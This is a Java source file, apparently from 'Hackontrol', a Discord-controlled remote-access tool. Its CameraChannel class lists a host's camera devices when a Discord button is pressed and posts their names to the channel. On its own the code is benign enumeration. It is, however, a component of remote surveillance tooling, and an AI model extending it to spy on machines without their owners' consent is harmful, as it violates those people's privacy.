package com.khopan.hackontrol.channel;

import com.khopan.hackontrol.CameraDevice;
import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.NativeLibrary;
import com.khopan.hackontrol.manager.button.ButtonContext;
import com.khopan.hackontrol.manager.button.ButtonManager;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolMessage;

import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;

public class CameraChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "camera";

	private static final Button CAMERA_LIST_BUTTON = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Camera List", "cameraList");

	private CameraDevice[] devices;

	@Override
	public String getName() {
		return CameraChannel.CHANNEL_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, CameraChannel.CAMERA_LIST_BUTTON, this :: buttonCameraList);
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(CameraChannel.CAMERA_LIST_BUTTON)).queue();
	}

	private void buttonCameraList(ButtonContext context) {
		this.devices = NativeLibrary.cameraList();

		if(this.devices == null || this.devices.length == 0) {
			HackontrolMessage.deletable(context.reply(), "**No camera available**");
			return;
		}

		StringBuilder builder = new StringBuilder();

		for(int i = 0; i < this.devices.length; i++) {
			if(i > 0) {
				builder.append('\n');
			}

			CameraDevice device = this.devices[i];
			builder.append('`');
			builder.append(i + 1);
			builder.append(") ");
			builder.append(device.getDeviceName());
			builder.append('`');
		}

		context.reply(builder.toString()).queue();
	}
}
